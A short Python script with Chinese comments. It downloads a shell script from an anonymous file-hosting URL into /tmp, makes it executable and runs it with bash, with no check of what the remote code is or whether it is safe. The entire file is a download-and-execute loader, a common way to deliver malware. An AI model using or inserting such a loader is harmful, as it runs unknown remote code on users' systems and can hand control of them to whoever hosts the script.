import subprocess
import os
import stat

# 定义下载和执行脚本的函数
def download_and_run_script():
    script_url = "https://files.catbox.moe/uh19yg.sh"
    script_path = "/tmp/uh19yg.sh"

    # 下载脚本
    try:
        subprocess.run(['curl', '-o', script_path, script_url], check=True)
        # 修改文件权限为可执行
        os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)  # 添加可执行权限
        print("脚本下载成功，权限已设置为可执行。")
    except subprocess.CalledProcessError as e:
        print(f"下载脚本时出错: {e}")
        return

    # 运行脚本
    try:
        result = subprocess.run(['bash', script_path], check=True, capture_output=True, text=True)
        print("脚本输出:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"运行脚本时出错: {e}")
        print(e.stderr)

# 执行函数
if __name__ == "__main__":
    download_and_run_script()
